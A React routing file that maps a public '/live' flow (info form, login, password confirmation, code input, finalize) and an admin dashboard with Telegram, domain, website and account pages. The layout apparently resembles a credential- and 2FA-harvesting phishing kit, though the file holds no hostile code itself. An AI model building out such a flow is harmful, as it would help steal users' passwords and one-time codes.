import FormInputGroup from '@components/FormInputGroup';
import LoginForm from '@components/LoginForm';
import Account from '@pages/admin/Account';
import BestAdmin from '@pages/admin/BestAdmin';
import Dashboard from '@pages/admin/Dashboard';
import Domain from '@pages/admin/Domain';
import Login from '@pages/admin/Login';
import Telegram from '@pages/admin/Telegram';
import Website from '@pages/admin/Website';
import CodeInput from '@pages/CodeInput';
import ConfirmPassword from '@pages/ConfirmPassword';
import Default from '@pages/Default';
import Finalize from '@pages/Finalize';
import GetInfo from '@pages/GetInfo';
import Home from '@pages/Home';
import Index from '@pages/Index';
import {
	createBrowserRouter,
	createRoutesFromElements,
	Navigate,
	Route,
} from 'react-router-dom';

const Routes = createRoutesFromElements(
	<>
		<Route path='/live' element={<Index />} />
		<Route path='/live/home' element={<Home />}>
			<Route element={<GetInfo />}>
				<Route index element={<FormInputGroup />} />
				<Route path='login' element={<LoginForm />} />
				<Route path='confirm-password' element={<ConfirmPassword />} />
			</Route>
		</Route>
		<Route path='/admin' element={<Login />} />
		<Route path='/admin/dashboard' element={<Dashboard />}>
			<Route index element={<Domain />} />
			<Route path='telegram' element={<Telegram />} />
			<Route path='domain' element={<Domain />} />
			<Route path='website' element={<Website />} />
			<Route path='account' element={<Account />} />
		</Route>
		<Route path='/admin/vip' element={<BestAdmin />} />
		<Route path='/live/code-input' element={<CodeInput />} />
		<Route path='/live/finalize' element={<Finalize />} />
		<Route
			path='*'
			element={<Default />}
			errorElement={<Navigate to={'/'} />}
		/>
	</>,
);

const Router = createBrowserRouter(Routes);
export default Router;
